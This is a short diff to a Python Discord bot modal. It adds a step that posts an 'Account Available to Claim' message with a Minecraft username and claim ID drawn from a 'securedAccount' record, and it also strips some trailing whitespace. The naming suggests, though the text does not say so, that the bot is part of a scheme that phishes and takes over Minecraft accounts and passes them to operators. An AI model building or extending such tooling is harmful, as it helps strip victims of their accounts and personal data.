@@ -112,8 +112,8 @@ class MyModalTwo(ui.Modal):
             )
         )
 
-        mc = securedAccount["minecraft"]                                                                        
-        name = mc['name'] if mc else "No Minecraft"  
+        mc = securedAccount["minecraft"]
+        name = mc['name'] if mc else "No Minecraft"
         print(securedAccount)
         await sendLogs(
             interaction.client, self.config,
@@ -124,3 +124,13 @@ class MyModalTwo(ui.Modal):
             ).set_thumbnail(url=f"https://mc-heads.net/avatar/{self.username}/128"),
             conly = True
         )
+
+        if self.config["claims"]["claims_enabled"]:
+            await sendLogs(
+                interaction.client, self.config,
+                discord.Embed(
+                    title="Account Available to Claim",
+                    description=f"**MC Username:** `{name}`\n**Claim ID:** `{securedAccount['claim_id']}`",
+                    color=0x79D990
+                )
+            )
